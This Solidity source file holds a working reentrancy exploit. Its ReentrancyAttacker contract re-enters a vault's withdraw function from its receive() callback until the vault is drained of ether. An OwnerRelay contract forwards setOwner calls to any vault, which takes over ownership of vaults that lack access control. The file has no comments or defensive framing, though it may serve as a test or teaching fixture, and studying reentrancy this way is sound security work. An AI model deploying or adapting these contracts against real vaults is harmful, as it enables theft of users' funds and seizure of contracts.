// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
    function setOwner(address newOwner) external;
}

contract OwnerRelay {
    function changeVaultOwner(
        address vault,
        address newOwner
    ) external {
        IVault(vault).setOwner(newOwner);
    }
}

contract ReentrancyAttacker {
    IVault public immutable vault;

    bool private attacking;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack() external {
        attacking = true;

        vault.withdraw(1 ether);

        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            uint256 vaultBalance = address(vault).balance;

            if (vaultBalance >= 1 ether) {
                vault.withdraw(1 ether);
            }
        }
    }
}
